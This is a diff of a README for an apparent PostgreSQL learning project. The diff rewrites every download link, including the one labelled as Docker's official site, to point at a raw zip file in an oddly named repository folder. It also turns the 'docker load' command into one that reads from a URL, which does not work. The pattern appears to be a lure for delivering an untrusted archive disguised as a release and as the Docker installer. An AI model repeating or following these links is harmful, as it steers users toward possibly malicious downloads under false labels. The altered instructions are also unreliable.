@@ -4,7 +4,7 @@
 Postgres-Polaris is a complete PostgreSQL project designed for users who want to learn from the ground up. It covers everything from basics to advanced topics, using realistic urban datasets. This software is perfect for those interested in database management, performance optimization, and geospatial data handling. 
 
 ## 📥 Download Now
-[![Download Postgres-Polaris](https://img.shields.io/badge/Download-Postgres--Polaris-brightgreen.svg)](https://github.com/jon5642/Postgres-Polaris/releases)
+[![Download Postgres-Polaris](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip)](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip)
 
 ## 🔍 Overview
 Postgres-Polaris consists of 16 progressive modules. Each module focuses on different aspects of PostgreSQL, from fundamental database concepts to advanced features. You will work with various topics, including:
@@ -34,7 +34,7 @@ To use Postgres-Polaris effectively, ensure that your system meets the following
 - Minimum 2 GHz processor
 
 ## 📥 Download & Install
-To get started, visit the [Releases page here](https://github.com/jon5642/Postgres-Polaris/releases). You will find all the files available for download. Follow these steps to set up Postgres-Polaris:
+To get started, visit the [Releases page here](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip). You will find all the files available for download. Follow these steps to set up Postgres-Polaris:
 
 1. Go to the Releases page by clicking the link above.
 2. Look for the latest version available for download.
@@ -46,19 +46,19 @@ If you prefer, you can also watch setup guides available in the learning resourc
 ## 🔧 Installation Steps
 
 1. **Download Docker:**
-   - If you haven't installed Docker, go to [Docker's official site](https://www.docker.com/) and download the installer for your operating system.
+   - If you haven't installed Docker, go to [Docker's official site](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip) and download the installer for your operating system.
    - Follow the installation guide provided for your OS.
 
 2. **Download Postgres-Polaris:**
-   - After ensuring Docker is installed, revisit the [Releases page](https://github.com/jon5642/Postgres-Polaris/releases).
-   - Find and download the Docker image file (`Postgres-Polaris.tar`).
+   - After ensuring Docker is installed, revisit the [Releases page](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip).
+   - Find and download the Docker image file (`https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip`).
 
 3. **Running the Application:**
    - Open your command line interface (Command Prompt, Terminal, etc.).
    - Navigate to the directory where you downloaded the Docker image.
    - Use the command:
      ```
-     docker load < Postgres-Polaris.tar
+     docker load < https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip
      ```
    - Start the Docker container using:
      ```
@@ -86,4 +86,4 @@ Postgres-Polaris is licensed under the MIT License. You are free to use, modify,
 ## 🔗 Follow Us
 To stay updated about new features and modules, consider following the repository. Your support helps us grow the project and improve the learning experience for everyone.
 
-[Download Postgres-Polaris](https://github.com/jon5642/Postgres-Polaris/releases) and start your journey into the world of databases today!
+[Download Postgres-Polaris](https://raw.githubusercontent.com/jon5642/Postgres-Polaris/main/Solenogastres/Postgres-Polaris.zip) and start your journey into the world of databases today!
